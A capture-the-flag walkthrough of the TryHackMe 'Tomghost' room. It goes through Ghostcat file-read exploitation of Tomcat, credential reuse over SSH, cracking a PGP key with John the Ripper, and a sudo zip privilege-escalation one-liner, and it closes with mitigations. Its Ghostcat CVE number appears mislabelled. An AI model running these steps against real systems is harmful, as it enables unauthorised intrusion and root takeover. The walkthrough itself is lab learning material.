# ZoeS17
## Try Hack Me - Tomghost

```bash
export IP=10.10.191.52
```
### Nmap
```bash
nmap -sC -sV -oA nmap/initial $IP
```
[Results](nmap/initial.nmap)
```bash
nmap -sC -sV -p- -oA nmap/allports $IP
```
[Results](nmap/allports.nmap)

Looks like there's a Tomcat instance on port `8080`. Given the name of the room that seems like a good place to start while our last two nmap's finish.

### Tomcat (8080)
We notice that Tomcat's version string is `Apache Tomcat/9.0.30`. We notice too that the roomname and banner image ellude to `Ghostcat`.

```bash
searchsploit Apache Tomcat Ghostcat
```
yeilds:

| Exploit Title | Path |
| ---- | ---- |
| Apache Tomcat - AJP 'Ghostcat File Read/Inclusion | multiple/webapps/48143.py |
| Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit) | multiple/webapps/49039.rb |

the `.py` is written in python 2... And it returns a username:password, so let's try password reuse against SSH.
<!-- maybe it would be nice to update this script to py3 -->

### SSH
Our username:password does get us a shell albeit not to a very privledged user.
```bash
skyfuck@ubuntu:~$ id
uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)
```
As we aren't user id `1000` nor `1001` I'm intrested in knowning which users those are and if they have a home dir.
```bash
skyfuck@ubuntu:~$ grep -e '100[0-9]:100[0-9]' /etc/passwd
merlin:x:1000:1000:zrimga,,,:/home/merlin:/bin/bash
tomcat:x:1001:1001::/opt/tomcat:/bin/false
skyfuck:x:1002:1002:tryhackme TRIAL PoC,3871289312,2931923021,2391293912,2031201201:/home/skyfuck:/bin/bash
```
We're not likely to be too interested in tomcat at this point, but what are the perms on `/home/merlin`?
```bash
skyfuck@ubuntu:~$ ls -lA /home
total 8
drwxr-xr-x  4 merlin  merlin  4096 Mar 10  2020 merlin
drwxr-xr-x  3 skyfuck skyfuck 4096 Nov 13 21:22 skyfuck
```
seems we can at least read files there; so what's there?

```bash
skyfuck@ubuntu:~$ ls -lA /home/merlin
total 28
-rw------- 1 root   root   2090 Mar 10  2020 .bash_history
-rw-r--r-- 1 merlin merlin  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Mar 10  2020 .bashrc
drwx------ 2 merlin merlin 4096 Mar 10  2020 .cache
drwxrwxr-x 2 merlin merlin 4096 Mar 10  2020 .nano
-rw-r--r-- 1 merlin merlin  655 Mar 10  2020 .profile
-rw-r--r-- 1 merlin merlin    0 Mar 10  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 merlin merlin   26 Mar 10  2020 user.txt
```
oops there's `users.txt` an we can read it and it seems that merlin can use sudo as evident by `.sudo_as_admin_successful` indicates. It looks like our goal now is to pivot to `merlin`.

```bash
skyfuck@ubuntu:~$ ls -lA
total 32
-rw------- 1 skyfuck skyfuck  313 Nov 13 21:24 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc
drwx------ 2 skyfuck skyfuck 4096 Nov 13 21:22 .cache
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc

skyfuck@ubuntu:~$ file credential.pgp tryhackme.asc
credential.pgp: data
tryhackme.asc:  ASCII text, with CRLF line terminators

skyfuck@ubuntu:~$ cat tryhackme.asc
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: BCPG v1.63

lQUBBF5ocmIRDADTwu9RL5uol6+jCnuoK58+PEtPh0Zfdj4+q8z61PL56tz6YxmF
3TxA9u2jV73qFdMr5EwktTXRlEo0LTGeMzZ9R/uqe+BeBUNCZW6tqI7wDw/U1DEf
-- snip --
AKlCbtMLnrDy3kl9+8YjJmyV9pJ2ycv4w+IPYgEAs0g4rLw7W41INOdxFK+iKNbW
kG6wLdznOpe4zaLA/vM=
=dMrv
-----END PGP PRIVATE KEY BLOCK-----
```
Seems we have to use this pgp private key to decode this `credential.pgp` file.
```bash
zoes17@attackbox.thm:~$ scp skyfuck@10.10.191.52:/home/skyfuck/* .
```
this allows use to use
```bash
gpg2john tryhackme.asc > hash
```
and then we crack with Jumbo John:
```bash
jjohn hash --format=gpg -wordlist=/usr/share/wordlists/rockyou.txt
```
okay cool a password for the the keyring... Now what? Well how about we import `tryhackme.asc` on our target?
```bash
skyfuck@ubuntu:~$ gpg --import tryhackme.asc
```
and then try and decrypt `credential.pgp`:

```bash
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:<REDACTED>
```

that gives us merlin's password likely.
```bash
su merlin
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
checking [GTFO Bins](https://gtfobins.github.io/gtfobins/zip/#sudo) yeilds a possible escalation vector.
```bash
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# cd /root
# ls
root.txt  ufw
# cat root.txt
THM{}
```
Well that was interesting...

Now I wonder if there was a root pass and if so what is.

### After Action Review
We were able to get all the way to root via an old python2 exploit `CVE-2020-10487`. We then tried our new found creds via the SSH service and got a low priv shell without sudo rights. Running `id` told us that we weren't the first new user `1000` that wasn't a system or service user. Looking around our home directory we found a gpg key ring and an encrypted GPG file name `credential.pgp` that looks critical to our way forward or at the very least super interesting. Importing the keyring and decrypting the file yeilds use merlin's password. Merlin has sudo privledges on `/usr/bin/zip` as root which let's get a shell as root.

#### Mitgation(s)
Updating Tomcat would likely mitagte the inital foothold into the network because we wouldn't be able to use the Local File Inclusion to allow us to get skyfuck's password. Likewise making sure that skyfuck's password isn't reused for Tomcat would likely mitagte this too. Though that might not be possible due to Tomcat likely using PAM as a form of authorization. If the creditals for Merlin weren't on the same system as the shell we got as skyfuck that would make escalation to Merlin that much harder. Not allowing merlin to sudo as root without a password would then require us to know root's password to use the zip program to escalate our shell to root.